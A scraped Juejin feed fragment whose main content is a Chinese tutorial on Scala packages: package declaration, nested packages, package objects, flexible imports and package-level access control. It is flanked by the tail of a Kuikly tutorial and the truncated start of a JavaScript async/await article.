<p>现在，重新编译运行，再次点击那只青蛙。伴随着熟悉的缩放动画，一声清脆的“呱”终于响了起来！虽然中间走了点小弯路，但我们最终还是用一种更“Kuikly”的方式，让我们的应用“活”了起来。这次的经历也让我们对Kuikly的声明式思想有了更深的理解：少一些命令，多一些声明，代码会变得更优雅、更可预测。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[包及其导入]]></title>    <link>https://juejin.cn/post/7575469988737957897</link>    <guid>https://juejin.cn/post/7575469988737957897</guid>    <pubDate>2025-11-24T03:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988737957897" data-draft-id="7575469988737744905" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="包及其导入"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2025-11-24T03:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="谁黑皮谁肘击谁在连累直升机"/> <meta itemprop="url" content="https://juejin.cn/user/2763534402854203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            包及其导入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2763534402854203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    谁黑皮谁肘击谁在连累直升机
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:31:55.000Z" title="Mon Nov 24 2025 03:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Scala 包（Package）的概念及使用</h2>
<p>Scala 的包（Package）本质与 Java 包一致，核心作用是 <strong>组织代码结构、避免类 / 特质 / 方法的命名冲突</strong>，同时支持访问控制（控制代码的可见性）。但 Scala 对包的语法进行了增强，比 Java 更灵活（如嵌套包、包对象、包前缀简化等）。</p>
<h3 data-id="heading-1">1. 包的核心概念</h3>
<ul>
<li>
<p><strong>本质</strong>：一个 “命名空间”（Namespace），用于将相关的类（Class）、特质（Trait）、对象（Object）、函数（Function）等代码元素分组管理。</p>
</li>
<li>
<p><strong>命名规范</strong>：通常遵循 “反向域名” 规则（与 Java 一致），例如 <code>com.company.project.module</code>，全小写字母，用 <code>.</code> 分隔层级。</p>
</li>
<li>
<p><strong>核心作用</strong>：</p>
<ol>
<li>避免命名冲突（不同包下可存在同名类，如 <code>com.a.User</code> 和 <code>com.b.User</code>）；</li>
<li>模块化管理代码（按功能拆分，如 <code>controller</code>、<code>service</code>、<code>model</code> 包）；</li>
<li>控制访问权限（通过 <code>private</code>、<code>protected</code> 等关键字限制包外访问）。</li>
</ol>
</li>
</ul>
<h3 data-id="heading-2">2. 包的定义与目录结构</h3>
<p>Scala 包的定义必须与 <strong>文件系统目录结构一致</strong>（否则编译器无法找到代码），这一点和 Java 完全相同。</p>
<h4 data-id="heading-3">（1）基础定义方式（与 Java 类似）</h4>
<p>通过 <code>package</code> 关键字声明包，放在文件最顶部，一个文件只能声明一个 “主包”（但可嵌套子包）。</p>
<h5 data-id="heading-4">示例：目录结构与包声明对应</h5>
<p>plaintext</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">src</span>/<span class="hljs-selector-tag">main</span>/<span class="hljs-selector-tag">scala</span>/          <span class="hljs-comment">// Scala 源代码根目录</span>
└── <span class="hljs-selector-tag">com</span>/
    └── <span class="hljs-selector-tag">example</span>/
        ├── <span class="hljs-selector-tag">model</span>/       <span class="hljs-comment">// 子包：存储数据模型</span>
        │   └── <span class="hljs-selector-tag">User</span><span class="hljs-selector-class">.scala</span>
        └── <span class="hljs-selector-tag">service</span>/     <span class="hljs-comment">// 子包：存储业务逻辑</span>
            └── <span class="hljs-selector-tag">UserService</span><span class="hljs-selector-class">.scala</span>
</code></pre>
<h5 data-id="heading-5">代码示例：<code>User.scala</code>（数据模型）</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 包声明：对应目录 com/example/model</span>
<span class="hljs-keyword">package</span> com.example.model

<span class="hljs-comment">// 包内定义类（默认访问权限：包可见）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>) {
  <span class="hljs-keyword">override</span> def toString: String = s<span class="hljs-string">"User(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>)"</span>
}

<span class="hljs-comment">// 包内定义对象（单例）</span>
<span class="hljs-keyword">object</span> User {
  <span class="hljs-comment">// 工厂方法：创建 User 实例</span>
  def apply(name: String, age: <span class="hljs-built_in">Int</span>): User = new User(name, age)
}
</code></pre>
<h5 data-id="heading-6">代码示例：<code>UserService.scala</code>（业务逻辑）</h5>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 包声明：对应目录 com/example/service</span>
package com.example.service

<span class="hljs-comment">// 导入其他包的类（与 Java 类似，用 import）</span>
<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-comment">// 业务方法：查询用户</span>
  <span class="hljs-function">def <span class="hljs-title">findUser</span><span class="hljs-params">(name: <span class="hljs-type">String</span>)</span>: User =</span> <span class="hljs-built_in">User</span>(name, <span class="hljs-number">20</span>)
}
</code></pre>
<h4 data-id="heading-7">（2）Scala 增强：嵌套包（Nested Package）</h4>
<p>Scala 支持在一个文件中定义嵌套包，无需创建多层目录（但仍建议目录与包结构一致，保证可读性）。</p>
<h5 data-id="heading-8">示例：嵌套包定义</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 外层包</span>
<span class="hljs-keyword">package</span> com.example {
  <span class="hljs-comment">// 子包 model（嵌套在 com.example 下）</span>
  <span class="hljs-keyword">package</span> model {
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String)
  }

  <span class="hljs-comment">// 子包 service（嵌套在 com.example 下）</span>
  <span class="hljs-keyword">package</span> service {
    <span class="hljs-keyword">import</span> model.User  <span class="hljs-comment">// 嵌套包内可直接导入同级子包，无需写全路径</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
      def getUser: User = new User(<span class="hljs-string">"Alice"</span>)
    }
  }
}
</code></pre>
<h5 data-id="heading-9">注意：</h5>
<ul>
<li>嵌套包的访问规则：内层包可直接访问外层包的元素（无需导入），外层包不能直接访问内层包（需显式导入）；</li>
<li>实际开发中，嵌套包多用于 “内部工具类” 或 “关联性极强的代码”，避免过度嵌套导致可读性下降。</li>
</ul>
<h4 data-id="heading-10">（3）Scala 专属：包对象（Package Object）</h4>
<p>Scala 不允许在包内直接定义函数 / 变量（Java 也不允许），但提供 <strong>包对象（Package Object）</strong>  来解决这个问题 —— 包对象是对应包的 “全局工具容器”，可定义全局函数、变量、隐式转换等，包内所有代码可直接访问。</p>
<h5 data-id="heading-11">包对象的定义规则：</h5>
<ul>
<li>包对象必须与对应包同名，且放在该包的 “父包” 下；</li>
<li>文件名固定为 <code>package.scala</code>（编译器会自动识别）。</li>
</ul>
<h5 data-id="heading-12">示例：定义包对象</h5>
<p>scala</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// 目录：com/example/package.scala（父包是 com，对应包是 example）</span>
<span class="hljs-keyword">package</span> com  <span class="hljs-comment">// 父包</span>

<span class="hljs-comment">// 定义 com.example 包的包对象</span>
<span class="hljs-keyword">package</span> <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">example</span> </span>{
  <span class="hljs-comment">// 全局常量（包内所有类可直接使用）</span>
  <span class="hljs-keyword">val</span> <span class="hljs-type">APP_NAME</span>: <span class="hljs-type">String</span> = <span class="hljs-string">"ScalaPackageDemo"</span>
  
  <span class="hljs-comment">// 全局函数（包内所有类可直接调用）</span>
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printLog</span></span>(msg: <span class="hljs-type">String</span>): <span class="hljs-type">Unit</span> = println(<span class="hljs-string">s"[<span class="hljs-subst">$APP_NAME</span>] <span class="hljs-subst">$msg</span>"</span>)
  
  <span class="hljs-comment">// 全局隐式转换（后续可直接生效）</span>
  <span class="hljs-keyword">implicit</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stringToInt</span></span>(s: <span class="hljs-type">String</span>): <span class="hljs-type">Int</span> = s.toInt
}
</code></pre>
<h5 data-id="heading-13">包对象的使用（无需导入，直接访问）</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  def test(): <span class="hljs-built_in">Unit</span> = {
    printLog(<span class="hljs-string">"测试包对象函数"</span>)  <span class="hljs-comment">// 直接调用包对象的函数</span>
    println(APP_NAME)          <span class="hljs-comment">// 直接访问包对象的常量</span>
    <span class="hljs-keyword">val</span> num: <span class="hljs-built_in">Int</span> = <span class="hljs-string">"123"</span>       <span class="hljs-comment">// 直接使用包对象的隐式转换（String → Int）</span>
  }
}
</code></pre>
<h5 data-id="heading-14">核心用途：</h5>
<ul>
<li>存储包级别的工具函数 / 常量（如配置、日志工具）；</li>
<li>定义包级别的隐式转换（避免在每个类中重复导入）；</li>
<li>统一管理包内依赖的公共资源。</li>
</ul>
<h3 data-id="heading-15">3. 包的导入（Import）</h3>
<p>Scala 的 <code>import</code> 语法比 Java 更灵活，支持通配、重命名、过滤等功能，核心目的是简化代码中对其他包元素的引用。</p>
<h4 data-id="heading-16">（1）基础导入（与 Java 一致）</h4>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 导入单个类</span>
<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-comment">// 导入多个类（用大括号包裹）</span>
<span class="hljs-keyword">import</span> com.example.model.{User, UserProfile}

<span class="hljs-comment">// 导入整个包（通配符，用 _ 代替 Java 的 *）</span>
<span class="hljs-keyword">import</span> com.example.model._
</code></pre>
<h4 data-id="heading-17">（2）Scala 增强：重命名与过滤</h4>
<p>避免导入冲突（如两个包有同名类），或简化长类名：</p>
<p>scala</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 重命名：将 User 重名为 ModelUser（避免冲突）</span>
<span class="hljs-keyword">import</span> com.example.model.User =&gt; ModelUser

<span class="hljs-comment">// 过滤：导入包中所有类，除了 User（exclude）</span>
<span class="hljs-keyword">import</span> com.example.model.{User =&gt; _, _}  <span class="hljs-comment">// 第一个 _ 表示“排除”，第二个 _ 表示“其余所有”</span>

<span class="hljs-comment">// 示例：解决冲突</span>
<span class="hljs-keyword">import</span> com.a.User
<span class="hljs-keyword">import</span> com.b.User =&gt; BUser  <span class="hljs-comment">// 重命名 com.b.User 为 BUser</span>

val userA = <span class="hljs-keyword">new</span> User(<span class="hljs-string">"A"</span>)
val userB = <span class="hljs-keyword">new</span> BUser(<span class="hljs-string">"B"</span>)  <span class="hljs-comment">// 无冲突</span>
</code></pre>
<h4 data-id="heading-18">（3）Scala 增强：按需导入（局部导入）</h4>
<p><code>import</code> 可在代码任意位置使用（不仅限于文件顶部），实现 “局部导入”（只在当前作用域生效），减少全局导入的冗余：</p>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-function">def <span class="hljs-title">test</span><span class="hljs-params">()</span>: Unit =</span> {
    <span class="hljs-comment">// 局部导入：只在 test() 方法内生效</span>
    <span class="hljs-keyword">import</span> com.example.model.User
    val user = <span class="hljs-keyword">new</span> <span class="hljs-built_in">User</span>(<span class="hljs-string">"局部导入"</span>)
  }
  
  <span class="hljs-comment">// 此处无法访问 User（超出局部导入作用域）</span>
}
</code></pre>
<h4 data-id="heading-19">（4）隐式导入（Implicit Import）</h4>
<p>Scala 会自动导入以下包，无需手动写 <code>import</code>：</p>
<ul>
<li><code>scala._</code>（Scala 核心类库，如 <code>List</code>、<code>Option</code>）；</li>
<li><code>scala.Predef._</code>（常用函数 / 常量，如 <code>println</code>、<code>String</code>、<code>Int</code>）；</li>
<li>当前包的包对象（如 <code>com.example</code> 包的代码会自动导入 <code>com.example.package</code>）。</li>
</ul>
<h3 data-id="heading-20">4. 包的访问控制</h3>
<p>Scala 的访问权限关键字（<code>private</code>、<code>protected</code>、<code>public</code>）可结合包使用，实现更精细的可见性控制（默认访问权限为 <code>public</code>，与 Java 一致）。</p>
<h4 data-id="heading-21">（1）private：私有访问</h4>
<ul>
<li>默认：<code>private</code> 修饰的元素只能在 <strong>当前类 / 对象内部</strong> 访问；</li>
<li>包级私有：<code>private[包名]</code> 修饰的元素可在 <strong>指定包及其子包</strong> 内访问（Scala 增强特性）。</li>
</ul>
<h5 data-id="heading-22">示例：包级私有</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.model

<span class="hljs-comment">// 包级私有类：只能在 com.example 包及其子包访问</span>
<span class="hljs-keyword">private</span>[example] <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-keyword">val</span> email: String)

<span class="hljs-comment">// 普通类（public）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> profile: UserProfile)
</code></pre>
<p>scala</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.{User, UserProfile}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  def <span class="hljs-title function_">test</span><span class="hljs-params">()</span>: Unit = {
    <span class="hljs-type">val</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-string">"alice@example.com"</span>)  <span class="hljs-comment">// 合法：UserProfile 是 com.example 包级私有</span>
    <span class="hljs-type">val</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"Alice"</span>, profile)
  }
}
</code></pre>
<p>scala</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 外部包（com.other）：无法访问包级私有类</span>
<span class="hljs-keyword">package</span> com.other

<span class="hljs-keyword">import</span> com.example.model.UserProfile

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
  <span class="hljs-type">val</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-string">"test@example.com"</span>)  <span class="hljs-comment">// 编译报错：UserProfile 不可见</span>
}
</code></pre>
<h4 data-id="heading-23">（2）protected：受保护访问</h4>
<ul>
<li>默认：<code>protected</code> 修饰的元素只能在 <strong>当前类及其子类</strong> 访问（与 Java 一致）；</li>
<li>包级受保护：<code>protected[包名]</code> 修饰的元素可在 <strong>指定包及其子包 + 子类</strong> 访问。</li>
</ul>
<h5 data-id="heading-24">示例：包级受保护</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.model

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String) {
  <span class="hljs-comment">// 包级受保护方法：com.example 包及其子包 + User 子类可访问</span>
  <span class="hljs-keyword">protected</span>[example] def getDetail: String = s<span class="hljs-string">"User: <span class="hljs-variable">$name</span>"</span>
}
</code></pre>
<p>scala</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.<span class="hljs-type">User</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserService</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> user = <span class="hljs-keyword">new</span> <span class="hljs-type">User</span>(<span class="hljs-string">"Alice"</span>)
    println(user.getDetail)  <span class="hljs-comment">// 合法：UserService 在 com.example 包下</span>
  }
}

<span class="hljs-comment">// 子类（无论是否在同一包）都可访问</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminUser</span>(<span class="hljs-params">name: <span class="hljs-type">String</span></span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span>(<span class="hljs-params">name</span>) </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printDetail</span></span>: <span class="hljs-type">Unit</span> = println(getDetail)  <span class="hljs-comment">// 合法：子类继承 User</span>
}
</code></pre>
<h4 data-id="heading-25">（3）public：公开访问（默认）</h4>
<p>未显式指定访问权限的元素默认是 <code>public</code>，任何包都可访问（与 Java 一致）。</p>
<h3 data-id="heading-26">5. 包的最佳实践</h3>
<ol>
<li><strong>目录与包结构一致</strong>：严格遵循 “包名对应目录路径”，例如 <code>com.example.model</code> 对应 <code>src/main/scala/com/example/model</code>，避免编译器找不到类；</li>
<li><strong>包命名规范</strong>：全小写字母，用反向域名（如 <code>com.company.project</code>），避免中文、特殊字符；</li>
<li><strong>按功能拆分包</strong>：推荐分层结构（如 <code>controller</code>（接口）、<code>service</code>（业务）、<code>model</code>（数据）、<code>util</code>（工具）），而非按类类型拆分；</li>
<li><strong>合理使用包对象</strong>：只放包级公共资源（工具函数、常量），避免将业务逻辑放入包对象；</li>
<li><strong>最小权限原则</strong>：非公开的元素尽量用 <code>private[包名]</code> 或 <code>protected</code> 限制访问，减少耦合；</li>
<li><strong>简化导入</strong>：避免导入冗余（用局部导入、重命名、过滤），减少命名冲突。</li>
</ol>
<h2 data-id="heading-27">总结</h2>
<p>Scala 的包在核心功能（组织代码、避免冲突）上与 Java 一致，但提供了 <strong>嵌套包、包对象、灵活导入、包级访问控制</strong> 等增强特性，更适合复杂项目的模块化管理。关键要点：</p>
<ol>
<li>包结构必须与目录结构一致，否则编译报错；</li>
<li>包对象是 Scala 专属，用于存储包级公共资源；</li>
<li>访问控制可通过 <code>private[包名]</code> 实现包级可见性，比 Java 更灵活；</li>
<li>导入语法支持重命名、过滤、局部导入，简化代码编写。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[js中async和await 的详细讲解]]></title>    <link>https://juejin.cn/post/7575457788664528948</link>    <guid>https://juejin.cn/post/7575457788664528948</guid>    <pubDate>2025-11-24T04:00:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788664528948" data-draft-id="7576077034742759458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="js中async和await 的详细讲解"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-11-24T04:00:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我的div丢了肿么办"/> <meta itemprop="url" content="https://juejin.cn/user/1310273593440398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            js中async和await 的详细讲解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1310273593440398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我的div丢了肿么办
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:00:02.000Z" title="Mon Nov 24 2025 04:00:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body 